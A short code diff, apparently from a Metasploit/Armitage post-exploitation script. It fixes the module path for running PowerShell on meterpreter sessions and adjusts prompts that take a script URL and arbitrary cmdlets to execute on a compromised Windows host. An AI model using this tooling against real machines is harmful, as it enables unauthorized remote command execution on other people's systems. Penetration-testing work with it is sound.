@@ -179,11 +179,11 @@ sub veilPowerUp {
 }
 
 sub customScript {
-	global('$command $scriptUrl');
+	global('$console $command $scriptUrl');
 	$console = console();
 	$console = open_console_tab("meterpreter $sid");
 	$scriptUrl = prompt_text("URL to your script");
-	$command = prompt_text("Script command + arguments");
+	$command = prompt_text("Script command and arguments");
 	sendCommand();
 
 }
@@ -226,7 +226,7 @@ global('$localCmd $console @commands @information $scriptUrl $command $argspromp
 						$args = $null;
 						$localCmd = "\"\& \{$2\}\"";
 				}
-				cmd($console, "use windows/manage/powershell/remote_powershell");
+				cmd($console, "use post/windows/manage/powershell/remote_powershell");
 				cmd_set($console, %(
 									SESSION => "$sid",
 									LOCAL 	=> "$localCmd"
@@ -252,7 +252,7 @@ sub custLocCommands {
 	$console = open_console_tab("meterpreter $sid");
 	$command = prompt_text("Enter your custom Cmdlet String to run with all arguments");
 	$localCmd = "\"\& \{$command\}\"";
-	cmd($console, "use windows/manage/powershell/remote_powershell");
+	cmd($console, "use post/windows/manage/powershell/remote_powershell");
 	cmd_set($console, %(
 						SESSION => "$sid",
 						LOCAL 	=> "$localCmd"
